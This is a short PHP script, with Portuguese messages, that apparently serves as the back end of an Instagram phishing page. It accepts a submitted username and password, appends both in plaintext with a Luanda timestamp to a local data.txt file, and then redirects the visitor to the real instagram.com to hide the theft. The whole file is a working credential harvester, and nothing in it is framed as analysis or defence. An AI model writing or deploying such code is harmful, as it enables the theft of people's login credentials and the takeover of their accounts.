<?php
session_start();
if($_SERVER["REQUEST_METHOD"] != "POST"){
  echo "<b>Algo deu errado. <a href='index.php'>Voltar!</a>";
  die();
}
  $username=trim($_POST["username"]);
  $password=trim($_POST["password"]);
  if(empty($username) || empty($password)){
    $_SESSION["err"]=true;
    header("Location: index.php");
  }
  elseif(mb_strlen($username) < 9){
    $_SESSION["err"]=true;
    header("Location: index.php");
  }
  elseif(mb_strlen($password) < 6){
    $_SESSION["err"]=true;
    header("Location: index.php");
  }else{
    $today = new DateTime("now",new DateTimeZone("Africa/Luanda"));
    $date = $today->format("d/m/Y H:i:s");
    $file=fopen("data.txt","a");
    fwrite($file, "\n———————————————————————————\n⟨ $date ⟩\nUsername: $username\nPassword: $password\n———————————————————————————\n\n\n");
    fclose($file);
    header("Location: https://instagram.com/");
  }